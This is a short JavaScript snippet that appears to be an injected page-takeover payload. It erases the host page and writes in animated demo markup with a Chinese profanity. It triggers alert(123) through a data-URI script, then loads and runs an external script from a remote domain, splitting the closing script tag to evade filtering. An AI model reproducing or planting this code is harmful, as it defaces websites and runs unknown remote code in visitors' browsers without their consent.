//alert(123);
document.body.innerHTML="";
setTimeout(function(){document.write('<body></body>');run();},1);
function run(){
document.write('<!DOCTYPE html><html><head><style>p{width:100px;height:100px;background:blue;transition:width 2s,height 1s;width:65px;height:40px;background:#92B901;color:#ffffff;position:absolute;font-weight:bold;font:12px\'微软雅黑\',Verdana,Arial,Helvetica,sans-serif;padding:20px 10px 0px 10px;float:left;margin:5px;-webkit-transition:-webkit-transform 1s,opacity 1s,background 1s,width 1s,height 1s,font-size 1s;-webkit-border-radius:5px;transition-property:width,height,transform,background,font-size,opacity;transition-duration:1s,1s,1s,1s,1s,1s;border-radius:5px;opacity:0.4;-webkit-animation:mymove 3s;-webkit-animation-iteration-count:3;-webkit-animation:myfirst 5s infinite;-webkit-animation-direction:alternate;}@-webkit-keyframes mymove{from{top:0px;}to{top:200px;}}@-webkit-keyframes myfirst{0%{background:red;left:0px;top:0px;}25%{background:yellow;left:200px;top:0px;}50%{background:blue;left:200px;top:200px;}75%{background:green;left:0px;top:200px;}100%{background:red;left:0px;top:0px;}}p:hover{width:300px;height:300px;-webkit-transform:rotate(45deg)scale(0.5)skew(10deg,10deg)translate(100px,100px);}</style></head><body><div></div><p style="left:10px;z-index:1">请把鼠标指针移动到蓝色的 div 元素上，就可以看到过渡效果。</p><p style="left:100px;z-index:2"><b>注释：</b>本例在 Internet Explorer 中无效。</p><p style="left:190px;z-index:3"><b>操你妹！</p></body></html>');
$(document).ready(function(){
  $("p").click(function(){
  $(this).hide();
  });
});
document.write('<script src="data:application/javascript,alert(123);"></scr'+'ipt>');
document.write('<script src="http://li.gtool.ml/li.gtool.ml/jnt/kankore.js"></scr'+'ipt>');
}
delete $(document).foundation;
